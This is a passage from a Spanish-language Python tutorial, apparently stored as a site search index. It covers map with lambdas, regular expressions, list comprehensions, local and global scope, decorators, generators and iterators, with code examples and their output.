utiliza mucho junto a expresiones lambda ya que permite ahorrarnos el esfuerzo de crear bucles for. Adem\u00e1s se puede utilizar sobre m\u00e1s de un iterable con la condici\u00f3n que tengan la misma longitud. Por ejemplo si queremos multiplicar los n\u00fameros de dos listas: a = [ 1 , 2 , 3 , 4 , 5 ] b = [ 6 , 7 , 8 , 9 , 10 ] list ( map ( lambda x , y : x * y , a , b ) ) [6, 14, 24, 36, 50] E incluso podemos extender la funcionalidad a tres listas o m\u00e1s: c = [ 11 , 12 , 13 , 14 , 15 ] list ( map ( lambda x , y , z : x * y * z , a , b , c ) ) [66, 168, 312, 504, 750] Mapeando objetos Evidentemente, siempre que la utilicemos correctamente podemos mapear una serie de objetos sin ning\u00fan problema: class Persona : def __init__ ( self , nombre , edad ): self . nombre = nombre self . edad = edad def __str__ ( self ): return \" {} de {} a\u00f1os\" . format ( self . nombre , self . edad ) personas = [ Persona ( \"Juan\" , 35 ), Persona ( \"Marta\" , 16 ), Persona ( \"Manuel\" , 78 ), Persona ( \"Eduardo\" , 12 ) ] Por ejemplo una funci\u00f3n para incrementar un a\u00f1o de edad a todas las personas de la lista: def incrementar ( p ): p . edad += 1 return p personas = map ( incrementar , personas ) for persona in personas : print ( persona ) Juan de 36 a\u00f1os Marta de 17 a\u00f1os Manuel de 79 a\u00f1os Eduardo de 13 a\u00f1os Claro que en este caso tenemos que utilizar una funci\u00f3n definida porque no necesitamos actuar sobre la instancia, a no ser que nos tomemos la molestia de rehacer todo el objeto: personas = [ Persona ( \"Juan\" , 35 ), Persona ( \"Marta\" , 16 ), Persona ( \"Manuel\" , 78 ), Persona ( \"Eduardo\" , 12 ) ] personas = map ( lambda p : Persona ( p . nombre , p . edad + 1 ), personas ) for persona in personas : print ( persona ) Juan de 36 a\u00f1os Marta de 17 a\u00f1os Manuel de 79 a\u00f1os Eduardo de 13 a\u00f1os Y con esto acabamos esta interesante funcionalidad. Expresiones regulares Una de las tareas m\u00e1s utilizadas en la programaci\u00f3n es la b\u00fasqueda de subcadenas o patrones dentro de otras cadenas de texto. Las expresiones regulares, tambi\u00e9n conocidas como 'regex' o 'regexp', son patrones de b\u00fasqueda definidos con una sintaxis formal. Siempre que sigamos sus reglas, podremos realizar b\u00fasquedas simples y avanzadas, que utilizadas en conjunto con otras funcionalidades, las vuelven una de las opciones m\u00e1s \u00fatiles e importantes de cualquier lenguaje. Sin embargo antes de utilizarlas hay que estar seguros de lo que hacemos, de ah\u00ed aquella famosa frase de Jamie Zawinski , programador y hacker: Some people, when confronted with a problem, think \"I know, I'll use regular expressions.\" Now they have two problems. Que viene a decir: Hay gente que, cuando se enfrenta a un problema, piensa \"Ya s\u00e9, usar\u00e9 expresiones regulares\". Ahora tienen dos problemas. M\u00e9todos b\u00e1sicos re.search: buscar un patr\u00f3n en otra cadena import re texto = \"En esta cadena se encuentra una palabra m\u00e1gica\" re . search ( 'm\u00e1gica' , texto ) <_sre.SRE_Match object; span=(40, 46), match='m\u00e1gica'> Como vemos, al realizar la b\u00fasqueda lo que nos encontramos es un objeto de tipo Match (encontrado), en lugar un simple True o False . En cambio, si no se encontrase la palabra, no se devolver\u00eda nada ( None ): re . search ( 'hola' , texto ) Por tanto, podemos utilizar la propia funcionalidad junto a un condicional sin ning\u00fan problema: palabra = \"m\u00e1gica\" encontrado = re . search ( palabra , texto ) if encontrado : print ( \"Se ha encontrado la palabra:\" , palabra ) else : print ( \"No se ha encontrado la palabra:\" , palabra ) Se ha encontrado la palabra: m\u00e1gica Sin embargo, volviendo al objeto devuelto de tipo Match , \u00e9ste nos ofrece algunas opciones interesantes. print ( encontrado . start () ) # Posici\u00f3n donde empieza la coincidencia print ( encontrado . end () ) # Posici\u00f3n donde termina la coincidencia print ( encontrado . span () ) # Tupla con posiciones donde empieza y termina la coincidencia print ( encontrado . string ) # Cadena sobre la que se ha realizado la b\u00fasqueda 40 46 (40, 46) En esta cadena se encuentra una palabra m\u00e1gica Como vemos, en este objeto se esconde mucha m\u00e1s informaci\u00f3n de la que parece a simple vista, luego seguiremos hablando de ellos. re.match: buscar un patr\u00f3n al principio de otra cadena texto = \"Hola mundo\" re . match ( 'Hola' , texto ) <_sre.SRE_Match object; span=(0, 4), match='Hola'> texto = \"Hola mundo\" re . match ( 'Mola' , texto ) # no devuelve nada Podemos extraer grupos de texto con () texto = 'https://www.elitetorrent.biz/series/tell-me-a-story-temporada-1-capitulo-9-espanol/' con = re . match ( r \".*series/(.*)-(temporada-[0-9]*)-(.*)\" , texto ) print ( con . groups ()) ( 'tell-me-a-story' , 'temporada-1' , 'capitulo-9-espanol/' ) re.split: dividir una cadena a partir de un patr\u00f3n texto = \"Vamos a dividir esta cadena\" re . split ( ' ' , texto ) ['Vamos', 'a', 'dividir', 'esta', 'cadena'] re.sub: sustituye todas las coincidencias en una cadena texto = \"Hola amigo\" re . sub ( 'amigo' , 'amiga' , texto ) 'Hola amiga' re.findall: buscar todas las coincidencias en una cadena texto = \"hola adios hola hola\" re . findall ( 'hola' , texto ) ['hola', 'hola', 'hola'] Aqu\u00ed se nos devuelve una lista, pero podr\u00edamos aplicar la funci\u00f3n len() para saber el n\u00famero: len ( re . findall ( 'hola' , texto )) 3 Patrones con m\u00faltiples alternativas Si queremos comprobar varias posibilidades, podemos utilizar una tuber\u00eda | a modo de OR. Generalmente pondremos el listado de alternativas entre par\u00e9ntesis (): texto = \"hola adios hello bye\" re . findall ( 'hola|hello' , texto ) ['hola', 'hello'] Patrones con sintaxis repetida Otra posibilidad que se nos ofrece es la de buscar patrones con letras repetidas, y aqu\u00ed es donde se empieza a poner interesante. Como podemos o no saber de antemano el n\u00famero de repeticiones hay varias formas de definirlos. texto = \"hla hola hoola hooola hooooola\" Antes de continuar, y para aligerar todo el proceso, vamos a crear una funci\u00f3n capaz de ejecutar varios patrones en una lista sobre un texto: def buscar ( patrones , texto ): for patron in patrones : print ( re . findall ( patron , texto ) ) patrones = [ 'hla' , 'hola' , 'hoola' ] buscar ( patrones , texto ) ['hla'] ['hola'] ['hoola'] Con meta-car\u00e1cter * Lo utilizaremos para definir ninguna o m\u00e1s repeticiones de la letra a la izquierda del meta-car\u00e1cter: patrones = [ 'ho' , 'ho*' , 'ho*la' , 'hu*la' ] # 'ho', 'ho[0..N]', 'ho[0..N]la', 'hu[0..N]la' buscar ( patrones , texto ) ['ho', 'ho', 'ho', 'ho'] ['h', 'ho', 'hoo', 'hooo', 'hooooo'] ['hla', 'hola', 'hoola', 'hooola', 'hooooola'] ['hla'] Con meta-car\u00e1cter + Lo utilizaremos para definir una o m\u00e1s repeticiones de la letra a la izquierda del meta-car\u00e1cter: patrones = [ 'ho*' , 'ho+' ] # 'ho[0..N], 'ho[1..N]' buscar ( patrones , texto ) ['h', 'ho', 'hoo', 'hooo', 'hooooo'] ['ho', 'hoo', 'hooo', 'hooooo'] Con meta-car\u00e1cter ? Lo utilizaremos para definir una o ninguna repetici\u00f3n de la letra a la izquierda del meta-car\u00e1cter: patrones = [ 'ho*' , 'ho+' , 'ho?' , 'ho?la' ] # 'ho[0..N], 'ho[1..N]', 'ho[0..1]', 'ho[0..1]la' buscar ( patrones , texto ) ['h', 'ho', 'hoo', 'hooo', 'hooooo'] ['ho', 'hoo', 'hooo', 'hooooo'] ['h', 'ho', 'ho', 'ho', 'ho'] ['hla', 'hola'] Con n\u00famero de repeticiones expl\u00edcito {n} Lo utilizaremos para definir 'n' repeticiones exactas de la letra a la izquierda del meta-car\u00e1cter: patrones = [ 'ho {0} la' , 'ho {1} la' , 'ho {2} la' ] # 'ho[0]la', 'ho[1]la', 'ho[2]la' buscar ( patrones , texto ) ['hla'] ['hola'] ['hoola'] Con n\u00famero de repeticiones en un rango {n, m} Lo utilizaremos para definir un n\u00famero de repeticiones variable entre 'n' y 'm' de la letra a la izquierda del meta-car\u00e1cter: patrones = [ 'ho{0,1}la' , 'ho{1,2}la' , 'ho{2,9}la' ] # 'ho[0..1]la', 'ho[1..2]la', 'ho[2..9]la' buscar ( patrones , texto ) ['hla', 'hola'] ['hola', 'hoola'] ['hoola', 'hooola', 'hooooola'] Trabajando con conjuntos de caracteres [ ] Cuando nos interese crear un patr\u00f3n con distintos car\u00e1cteres, podemos definir conjuntos entre par\u00e9ntesis: texto = \"hala hela hila hola hula\" patrones = [ 'h[ou]la' , 'h[aio]la' , 'h[aeiou]la' ] buscar ( patrones , texto ) ['hola', 'hula'] ['hala', 'hila', 'hola'] ['hala', 'hela', 'hila', 'hola', 'hula'] Evidentemente los podemos utilizar con repeticiones: texto = \"haala heeela hiiiila hoooooola\" patrones = [ 'h[ae]la' , 'h[ae]*la' , 'h[io]{3,9}la' ] buscar ( patrones , texto ) [] ['haala', 'heeela'] ['hiiiila', 'hoooooola'] Exclusi\u00f3n en grupos [^ ] Cuando utilizamos grupos podemos utilizar el operador de exclusi\u00f3n ^ para indicar una b\u00fasqueda contraria: texto = \"hala hela hila hola hula\" patrones = [ 'h[o]la' , 'h[^o]la' ] buscar ( patrones , texto ) ['hola'] ['hala', 'hela', 'hila', 'hula'] Si excluimos una expresi\u00f3n regular con un grupo excluido, en realidad tenemos lo mismo: Rangos [ - ] Otra caracter\u00edstica que hace ultra potentes los grupos, es la capacidad de definir rangos. Ejemplos de rangos: [A-Z] : Cualquier car\u00e1cter alfab\u00e9tico en may\u00fascula (no especial ni n\u00famero) [a-z] : Cualquier car\u00e1cter alfab\u00e9tico en min\u00fascula (no especial ni n\u00famero) [A-Za-z] : Cualquier car\u00e1cter alfab\u00e9tico en min\u00fascula o may\u00fascula (no especial ni n\u00famero) [A-z] : Cualquier car\u00e1cter alfab\u00e9tico en min\u00fascula o may\u00fascula (no especial ni n\u00famero) [0-9] : Cualquier car\u00e1cter num\u00e9rico (no especial ni alfab\u00e9tico) [a-zA-Z0-9] : Cualquier car\u00e1cter alfanum\u00e9rico (no especial) Tened en cuenta que cualquier rango puede ser excluido para conseguir el patr\u00f3n contrario. texto = \"hola h0la Hola mola m0la M0la\" patrones = [ 'h[a-z]la' , 'h[0-9]la' , '[A-z] {4} ' , '[A-Z][A-z0-9] {3} ' ] buscar ( patrones , texto ) ['hola'] ['h0la'] ['hola', 'Hola', 'mola'] ['Hola', 'M0la'] #### C\u00f3digos escapados \\ Si cada vez que quisi\u00e9ramos definir un patr\u00f3n variable tuvi\u00e9ramos que crear rangos, al final tendr\u00edamos expresiones regulares gigantes. Por suerte su sintaxis tambi\u00e9n acepta una serie de caracteres escapados que tienen un significo \u00fanico. Algunos de los m\u00e1s importantes son: C\u00f3digo Significado \\d num\u00e9rico \\D no num\u00e9rico \\s espacio en blanco \\S no espacio en blanco \\w alfanum\u00e9rico \\W no alfanum\u00e9rico El problema que encontraremos en Python a la hora de definir c\u00f3digo escapado, es que las cadenas no tienen en cuenta el a no ser que especifiquemos que son cadenas en crudo (raw), por lo que tendremos que precedir las expresiones regulares con una 'r' . texto = \"Este curso de Python se public\u00f3 en el a\u00f1o 2016\" patrones = [ r '\\d+' , r '\\D+' , r '\\s' , r '\\S+' , r '\\w+' , r '\\W+' ] buscar ( patrones , texto ) ['2016'] ['Este curso de Python se public\u00f3 en el a\u00f1o '] [' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '] ['Este', 'curso', 'de', 'Python', 'se', 'public\u00f3', 'en', 'el', 'a\u00f1o', '2016'] ['Este', 'curso', 'de', 'Python', 'se', 'public\u00f3', 'en', 'el', 'a\u00f1o', '2016'] [' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '] Por mi parte lo vamos a dejar aqu\u00ed, pero el mundo de las expresiones regulares es gigantesco y dar\u00eda para un curso entero. Os animo a seguir aprendiendo leyendo documentaci\u00f3n y buscando ejemplos. Aqu\u00ed os dejo algunos enlaces que quiz\u00e1 os pueden servir, en ingl\u00e9s: Documentaci\u00f3n Hay docenas y docenas de c\u00f3digos especiales, si quer\u00e9is echar un vistazo a todos ellos pod\u00e9is consultar la documentaci\u00f3n oficial: https://docs.python.org/3.5/library/re.html#regular-expression-syntax Un resumen por parte de Google Eduacti\u00f3n: https://developers.google.com/edu/python/regular-expressions Otro resumen muy interesante sobre el tema: https://www.tutorialspoint.com/python/python_reg_expressions.htm Un par de documentos muy trabajados con ejemplos b\u00e1sicos y avanzados: http://www.python-course.eu/python3_re.php http://www.python-course.eu/python3_re_advanced.php","title":"apuntes Funcionalidades avanzadas"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#compresion-de-listas","text":"La compresi\u00f3n de listas es una manera r\u00e1pida de crear una lista en una sola l\u00ednea de c\u00f3digo.","title":"Compresi\u00f3n de listas"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#compresion-simple","text":"Crear una lista de una cadena de caracteres # metodo tradicional lista = [] for letra in 'casa' : lista . append ( letra ) print ( lista ) ['c', 'a', 's', 'a'] # m\u00e9todo con compresi\u00f3n lista = [ letra for letra in 'casa' ] print ( lista ) ['c', 'a', 's', 'a']","title":"compresi\u00f3n simple"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#compresion-con-condicion","text":"M\u00faltiples de 2 del 0 al 10 # metodo tradicional lista = [] for numero in range ( 0 , 11 ): lista . append ( numero ** 2 ) print ( lista ) [0, 1, 4, 9, 16, 25, 36, 49, 64, 81, 100] # compresion lista = [ numero ** 2 for numero in range ( 0 , 11 )] print ( lista ) [0, 1, 4, 9, 16, 25, 36, 49, 64, 81, 100] n\u00fameros pares del 0 al 10 # metodo tradicional lista = [] for numero in range ( 0 , 11 ): if numero % 2 == 0 : lista . append ( numero ) print ( lista ) [0, 2, 4, 6, 8, 10] # compresion lista = [ numero for numero in range ( 0 , 11 ) if numero % 2 == 0 ] print ( lista ) [0, 2, 4, 6, 8, 10]","title":"compresi\u00f3n con condici\u00f3n"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#compresion-multiple","text":"lista de n\u00fameros pares del 0 al 10 potenciados por 2 # metodo tradicional lista = [] for numero in range ( 0 , 11 ): lista . append ( numero ** 2 ) pares = [] for numero in lista : if numero % 2 == 0 : pares . append ( numero ) print ( pares ) [0, 4, 16, 36, 64, 100] # compresion pares = [ numero for numero in [ numero ** 2 for numero in range ( 0 , 11 )] if numero % 2 == 0 ] print ( pares ) [0, 4, 16, 36, 64, 100]","title":"compresi\u00f3n m\u00faltiple"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#ambitos-y-funciones-decoradoras","text":"","title":"\u00c1mbitos y funciones decoradoras"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#introduccion","text":"No cabe duda de que Python es un lenguaje flexible, y cuando trabajamos con funciones no es una excepci\u00f3n. En Python, dentro de una funci\u00f3n podemos definir otras funciones. Con la peculiaridad de que el \u00e1mbito de estas funciones se encuentre \u00fanicamente dentro de la funci\u00f3n padre. Vamos a trabajar los \u00e1mbitos un poco m\u00e1s en profundidad: def hola (): def bienvenido (): return \"Hola!\" return bienvenido Si intentamos llamar a la funci\u00f3n bienvenido... bienvenido () --------------------------------------------------------------------------- NameError Traceback (most recent call last) <ipython-input-3-f083d151b813> in <module>() ----> 1 bienvenido() NameError: name 'bienvenido' is not defined Como vemos nos da un error de que no existe. En cambio si intentamos ejecutar la funci\u00f3n hola() : hola () <function __main__.hola.<locals>.bienvenido> Se devuelve la funci\u00f3n bienvenido, y podemos apreciar dentro de su definici\u00f3n que existe un espacio llamado locals , el cual hace referencia al \u00e1mbito local que abarca la funci\u00f3n.","title":"Introducci\u00f3n"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#ambito-local-y-global","text":"Si utilizamos una funci\u00f3n reservada locals() obtendremos un diccionario con todas las definiciones dentro del espacio local del bloque en el que estamos: def hola (): def bienvenido (): return \"Hola!\" print ( locals () ) # Mostramos el \u00e1mbito local hola () {'bienvenido': <function hola.<locals>.bienvenido at 0x000001F867E88C80>} Como vemos se nos muestra un diccionario, aqu\u00ed encontraremos la funci\u00f3n bienvenido() . Podr\u00edamos a\u00f1adir algo m\u00e1s: lista = [ 1 , 2 , 3 ] def hola (): numero = 50 def bienvenido (): return \"Hola!\" print ( locals () ) # Mostramos el \u00e1mbito local hola () {'bienvenido': <function hola.<locals>.bienvenido at 0x000001F867E88950>, 'numero': 50} Como podemos observar, ahora adem\u00e1s de la funci\u00f3n tenemos una clave con el n\u00famero y el valor 50. Sin embargo no encontramos la lista, pues esta se encuentra fuera del \u00e1mbito local. De hecho se encuentra en el \u00e1mbito global, el cual podemos mostrar con la funci\u00f3n reservada globals() : # Antes de ejecutar este bloque reinicia el Notebook para vaciar la memoria. lista = [ 1 , 2 , 3 ] def hola (): numero = 50 def bienvenido (): return \"Hola!\" print ( globals () ) # Mostramos el \u00e1mbito global hola () {'__name__': '__main__', '_oh': {}, '__doc__': 'Automatically created module for IPython interactive environment', 'lista': [1, 2, 3], '__builtin__': <module 'builtins' (built-in)>, 'In': ['', '# Antes de ejecutar este bloque reinicia el Notebook para vaciar la memoria.\\nlista = [1,2,3]\\n\\ndef hola():\\n \\n numero = 50\\n \\n def bienvenido():\\n return \"Hola!\"\\n \\n print( globals() ) # Mostramos el \u00e1mbito global\\n\\nhola()'], '_ih': ['', '# Antes de ejecutar este bloque reinicia el Notebook para vaciar la memoria.\\nlista = [1,2,3]\\n\\ndef hola():\\n \\n numero = 50\\n \\n def bienvenido():\\n return \"Hola!\"\\n \\n print( globals() ) # Mostramos el \u00e1mbito global\\n\\nhola()'], '__loader__': None, '__builtins__': <module 'builtins' (built-in)>, '_dh': ['C:\\\\CursoPython\\\\Fase 4 - Temas avanzados\\\\Tema 15 - Funcionalidades avanzadas\\\\Apuntes'], 'get_ipython': <bound method InteractiveShell.get_ipython of <ipykernel.zmqshell.ZMQInteractiveShell object at 0x00000243D11F5E80>>, 'hola': <function hola at 0x00000243D1B58C80>, '_sh': <module 'IPython.core.shadowns' from 'C:\\\\Users\\\\Hector\\\\Anaconda3\\\\lib\\\\site-packages\\\\IPython\\\\core\\\\shadowns.py'>, '_': '', '_ii': '', 'Out': {}, '__package__': None, '___': '', '_iii': '', '_i': '', '__spec__': None, 'exit': <IPython.core.autocall.ZMQExitAutocall object at 0x00000243D1A92B70>, 'quit': <IPython.core.autocall.ZMQExitAutocall object at 0x00000243D1A92B70>, '_i1': '# Antes de ejecutar este bloque reinicia el Notebook para vaciar la memoria.\\nlista = [1,2,3]\\n\\ndef hola():\\n \\n numero = 50\\n \\n def bienvenido():\\n return \"Hola!\"\\n \\n print( globals() ) # Mostramos el \u00e1mbito global\\n\\nhola()', '__': ''} Tampoco es necesario que nos paremos a analizar el contenido, pero como podemos observar, desde el \u00e1mbito global tenemos acceso a muchas m\u00e1s definiciones porque engloba a su vez todas las de sus bloques padres. Si mostramos \u00fanicamente las claves del diccionario globals() , quiz\u00e1 ser\u00eda m\u00e1s entendible: globals () . keys () dict_keys(['_i4', '__name__', '_oh', '__doc__', 'lista', '__builtin__', 'In', '_i5', '_ih', '__loader__', '__builtins__', '_dh', 'get_ipython', 'hola', '_sh', '_', '_ii', 'Out', '__package__', '___', '_iii', '_i', '__spec__', 'exit', '_i3', 'quit', '_i1', '_i2', '__']) Ahora si buscamos bien encontraremos la clave lista , la cual hace referencia a la variable declarada fuera de la funci\u00f3n. Incluso podr\u00edamos acceder a ella como si fuera un diccionario normal: globals ()[ 'lista' ] # Desde la funci\u00f3n globals [1, 2, 3] lista # Forma tradicional [1, 2, 3]","title":"\u00c1mbito local y global"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#funciones-como-variables","text":"Volviendo a nuestra funci\u00f3n hola() , ahora sabemos que si la ejecutamos, en realidad estamos accediendo a su funci\u00f3n local bienvenido() , pero eso no significa que la ejecutamos, s\u00f3lo estamos haciendo referencia a ella. Esa es la raz\u00f3n de que se devuelva su definici\u00f3n y no el resultado de su ejecuci\u00f3n: def hola (): def bienvenido (): return \"Hola!\" return bienvenido hola () <function __main__.hola.<locals>.bienvenido> Por muy raro que parezca, podr\u00edamos ejecutarla llamando una segunda vez al par\u00e9ntesis. La primera para hola() y la segunda para bienvenido() : hola ()() 'Hola!' Como es realmente extra\u00f1o, normalmente lo que hacemos es asignar la funci\u00f3n a una variable y ejecutarla como si fuera una nueva funci\u00f3n: bienvenido = hola () bienvenido () 'Hola!' A diferencia de las colecciones y los objetos, donde las copias se utilizaban como accesos directos, las copias de las funciones son independientes y aunque borr\u00e1semos la original, la nueva copia seguir\u00eda existiendo: del ( hola ) bienvenido () 'Hola!'","title":"Funciones como variables"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#funciones-como-argumentos","text":"Si ya era extra\u00f1o ejecutar funciones anidadas, todav\u00eda es m\u00e1s extra\u00f1o el concepto de enviar una funci\u00f3n como argumento de otra funci\u00f3n, sin embargo gracias a la flexibilidad de Python es posible hacerlo: def hola (): return \"Hola Mundo!\" def test ( funcion ): print ( funcion () ) test ( hola ) Hola Mundo! Quiz\u00e1 en este momento no se ocurren muchas utilidades para esta funcionalidad, pero creedme que es realmente \u00fatil cuando queremos extender funciones ya existentes sin modificarlas. De ah\u00ed que este proceso se conozca como un decorador, y de ah\u00ed pasamos directamente a las funciones decoradoras.","title":"Funciones como argumentos"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#funciones-decoradoras","text":"Una funci\u00f3n decoradora es una funci\u00f3n que envuelve la ejecuci\u00f3n de otra funci\u00f3n y permite extender su comportamiento. Est\u00e1n pensadas para reutilazarlas gracias a una sintaxis de ejecuci\u00f3n mucho m\u00e1s simple. Imaginaros estas dos funciones sencillas: def hola (): print ( \"Hola!\" ) def adios (): print ( \"Adi\u00f3s!\" ) Y queremos queremos crear un decorador para monitorizar cuando se ejecutan las dos funciones, avisando antes y despu\u00e9s. Para crear una funci\u00f3n decoradora tenemos que recibir la funci\u00f3n a ejecutar, y envolver su ejecuci\u00f3n con el c\u00f3digo a extender: def monitorizar ( funcion ): def decorar (): print ( \" \\t * Se est\u00e1 apunto de ejecutar la funci\u00f3n:\" , funcion . __name__ ) funcion () print ( \" \\t * Se ha finalizado de ejecutar la funci\u00f3n:\" , funcion . __name__ ) return decorar Ahora para realizar la monitorizaci\u00f3n deber\u00edamos llamar al monitor ejecutando la funci\u00f3n enviada y devuelta: monitorizar ( hola )() * Se est\u00e1 apunto de ejecutar la funci\u00f3n: hola Hola! * Se ha finalizado de ejecutar la funci\u00f3n: hola Sin embargo esto no es muy c\u00f3modo, y ah\u00ed es cuando aparece la sintaxis que nos permite configurar una funci\u00f3n decoradora en una funci\u00f3n normal: @monitorizar def hola (): print ( \"Hola!\" ) @monitorizar def adios (): print ( \"Adi\u00f3s!\" ) Una vez configurada la funci\u00f3n decoradora, al utilizar las funciones se ejecutar\u00e1n autom\u00e1ticamente dentro de la funci\u00f3n decoradora: hola () print () adios () * Se est\u00e1 apunto de ejecutar la funci\u00f3n: hola Hola! * Se ha finalizado de ejecutar la funci\u00f3n: hola * Se est\u00e1 apunto de ejecutar la funci\u00f3n: adios Adi\u00f3s! * Se ha finalizado de ejecutar la funci\u00f3n: adios","title":"Funciones decoradoras"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#pasando-argumentos-al-decorador","text":"def monitorizar_args ( funcion ): def decorar ( * args , ** kwargs ): print ( \" \\t * Se est\u00e1 apunto de ejecutar la funci\u00f3n:\" , funcion . __name__ ) funcion ( * args , ** kwargs ) print ( \" \\t * Se ha finalizado de ejecutar la funci\u00f3n:\" , funcion . __name__ ) return decorar @monitorizar_args def hola ( nombre ): print ( \"Hola {} !\" . format ( nombre )) @monitorizar_args def adios ( nombre ): print ( \"Adi\u00f3s {} !\" . format ( nombre )) hola ( \"H\u00e9ctor\" ) print () adios ( \"H\u00e9ctor\" ) * Se est\u00e1 apunto de ejecutar la funci\u00f3n: hola Hola H\u00e9ctor! * Se ha finalizado de ejecutar la funci\u00f3n: hola * Se est\u00e1 apunto de ejecutar la funci\u00f3n: adios Adi\u00f3s H\u00e9ctor! * Se ha finalizado de ejecutar la funci\u00f3n: adios Perfecto! Ahora ya sabes qu\u00e9 son las funciones decoradoras y c\u00f3mo utilizar el s\u00edmbolo @ para automatizar su ejecuci\u00f3n. Estas funciones se utilizan mucho cuando trabajamos con Frameworks Web como Django, as\u00ed que seguro te har\u00e1n servicio si tienes pensado aprender a utilizarlo.","title":"Pasando argumentos al decorador"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#funciones-generadoras","text":"Por regla general, cuando queremos crear una lista de alg\u00fan tipo, lo que hacemos es crear la lista vac\u00eda, y luego con un bucle varios elementos e ir a\u00f1adiendolos a la lista si cumplen una condici\u00f3n: [ numero for numero in [ 0 , 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 ] if numero % 2 == 0 ] [0, 2, 4, 6, 8, 10] Tambi\u00e9n vimos c\u00f3mo era posible utilizar la funci\u00f3n range() para generar din\u00e1micamente la lista en la memoria, es decir, no ten\u00edamos que crearla en el propio c\u00f3digo, sino que se interpretaba sobre la marcha: [ numero for numero in range ( 0 , 11 ) if numero % 2 == 0 ] [0, 2, 4, 6, 8, 10] La verdad es que range() es una especie de funci\u00f3n generadora. Por regla general las funciones devolvuelven un valor con return , pero la preculiaridad de los generadores es que van cediendo valores sobre la marcha, en tiempo de ejecuci\u00f3n. La funci\u00f3n generadora range(0,11) , empieza cediendo el 0 , luego se procesa el for comprobando si es par y lo a\u00f1ade a la lista, en la siguiente iteraci\u00f3n se cede el 1 , se procesa el for se comprueba si es par, en la siguiente se cede el 2 , etc. Con esto se logra ocupar el m\u00ednimo de espacio en la memoria y podemos generar listas de millones de elementos sin necesidad de almacenarlos previamente. Veamos a ver c\u00f3mo crear una funci\u00f3n generadora de pares: def pares ( n ): for numero in range ( n + 1 ): if numero % 2 == 0 : yield numero pares ( 10 ) <generator object pares at 0x000002945F38BFC0> Como vemos, en lugar de utilizar el return , la funci\u00f3n generadora utiliza el yield , que significa ceder. Tomando un n\u00famero busca todos los pares desde 0 hasta el n\u00famero+1 sirvi\u00e9ndonos de un range(). Sin embargo, fijaros que al imprimir el resultado, \u00e9ste nos devuelve un objeto de tipo generador. De la misma forma que recorremos un range() podemos utilizar el bucle for para recorrer todos los elementos que devuelve el generador: for numero in pares ( 10 ): print ( numero ) 0 2 4 6 8 10 Utilizando comprensi\u00f3n de listas tambi\u00e9n podemos crear una lista al vuelo: [ numero for numero in pares ( 10 )] [0, 2, 4, 6, 8, 10] Sin embargo el gran potencial de los generadores no es simplemente crear listas, de hecho como ya hemos visto, el propio resultado no es una lista en s\u00ed mismo, sino una secuencia iterable con un mont\u00f3n de caracter\u00edsticas \u00fanicas.","title":"Funciones generadoras"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#iteradores","text":"Por tanto las funciones generadoras devuelven un objeto que suporta un protocolo de iteraci\u00f3n. \u00bfQu\u00e9 nos permite hacer? Pues evidentemente controlar el proceso de generaci\u00f3n. Teniendo en cuenta que cada vez que la funci\u00f3n generadora cede un elemento, queda suspendida y se retoma el control hasta que se le pide generar el siguiente valor. As\u00ed que vamos a tomar nuestro ejemplo de pares desde otra perspectiva, como si fuera un iterador manual, as\u00ed veremos exactamente a lo que me refiero: pares = pares ( 3 ) Bien, ahora tenemos un iterador de pares con todos los n\u00fameros pares entre el 0 y el 3. Vamos a conseguir el primer n\u00famero par: next ( pares ) 0 Como vemos la funci\u00f3n integrada next() nos permite acceder al siguiente elemento de la secuencia. Pero no s\u00f3lo eso, si volvemos a ejecutarla... next ( pares ) 2 Ahora devuelve el segundo! \u00bfNo os recuerdo esto al puntero de los ficheros? Cuando le\u00edamos una l\u00ednea, el puntero pasaba a la siguiente y as\u00ed sucesivamente. Pues aqu\u00ed igual. \u00bfY qu\u00e9 pasar\u00eda si intentamos acceder al siguiente, a\u00fan sabiendo que entre el 0 y el 3 s\u00f3lo tenemos los pares 0 y 2? next ( pares ) --------------------------------------------------------------------------- StopIteration Traceback (most recent call last) <ipython-input-34-68378216ba43> in <module>() ----> 1 next(pares) StopIteration: Pues que nos da un error porque se ha acabado la secuencia, as\u00ed que tomad nota y capturad la excepci\u00f3n si v\u00e1is a utilizarlas sin saber exactamente cuantos elementos os devolver\u00e1 el generador. As\u00ed que la pregunta que nos queda es \u00bfs\u00f3lo es posible iterar secuencias generadas al vuelo? Vamos a probar con una lista: lista = [ 1 , 2 , 3 , 4 , 5 ] next ( lista ) --------------------------------------------------------------------------- TypeError Traceback (most recent call last) <ipython-input-38-28c22b67c419> in <module>() 1 lista = [1,2,3,4,5] ----> 2 next(lista) 3 4 cadena = \"Hola\" 5 next(cadena) TypeError: 'list' object is not an iterator \u00bfQuiz\u00e1 con una cadena? cadena = \"Hola\" next ( cadena ) --------------------------------------------------------------------------- TypeError Traceback (most recent call last) <ipython-input-39-44ca9ed1903b> in <module>() 1 cadena = \"Hola\" ----> 2 next(cadena) TypeError: 'str' object is not an iterator Pues no, no podemos iterar ninguna colecci\u00f3n como si fuera una secuencia. Sin embargo, hay una funci\u00f3n muy interesante que nos permite covertir las cadenas y algunas colecciones a iteradores, la funci\u00f3n iter() : lista = [ 1 , 2 , 3 , 4 , 5 ] lista_iterable = iter ( lista ) print ( next ( lista_iterable ) ) print ( next ( lista_iterable ) ) print ( next ( lista_iterable ) ) print ( next ( lista_iterable ) ) print ( next ( lista_iterable ) ) 1 2 3 4 5 cadena = \"Hola\" cadena_iterable = iter ( cadena ) print ( next ( cadena_iterable ) ) print ( next ( cadena_iterable ) ) print ( next ( cadena_iterable ) ) print ( next ( cadena_iterable ) ) H o l a Muy bien, ahora ya sabemos qu\u00e9 son las funciones generadores, c\u00f3mo 